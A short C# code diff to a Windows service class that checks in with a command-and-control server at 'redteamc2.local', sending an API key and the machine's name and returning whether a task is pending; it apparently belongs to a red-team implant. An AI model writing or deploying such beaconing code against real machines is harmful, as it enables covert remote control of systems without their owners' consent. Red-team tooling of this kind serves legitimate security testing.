@@ -3,26 +3,29 @@ namespace App.WindowsService;
 
 public class Checkin
 {
-    public string GetPendingC2op()
+    public bool GetPendingC2op(Config config)
     {
         using(var client = new HttpClient())
         {
-            var endpoint = new Uri("http://127.0.0.1:8888/endpoints/agent/get-pending/VjPcll65.h6WAszekpKiKRrQimHfYrt8zByXJpRtI");
+            var endpoint = new Uri($"http://redteamc2.local:8888/endpoints/agent/get-pending/{config.api_key}/{Environment.MachineName}");
             var result = client.GetAsync(endpoint).Result;
-            var json = result.Content.ReadAsStringAsync().Result;
-            Console.WriteLine($"first (json): {json}");
-            var data = JsonConvert.DeserializeObject<JSONResponse>(json);
-            if(data != null)
+            var statusCode = (int)result.StatusCode;
+            if(statusCode == 200)
             {
-                Console.WriteLine($"second (data): {data.isPending}");
+                var json = result.Content.ReadAsStringAsync().Result;
+                var data = JsonConvert.DeserializeObject<JSONResponse>(json);
+                if (data != null)
+                {
+                    return data.IsPending;
+                }
             }
-            return json
+            return false;
         }
     }
 }
 
 public class JSONResponse
 {
-    public bool isPending { get; set; }
+    public bool IsPending { get; set; }
 }
 
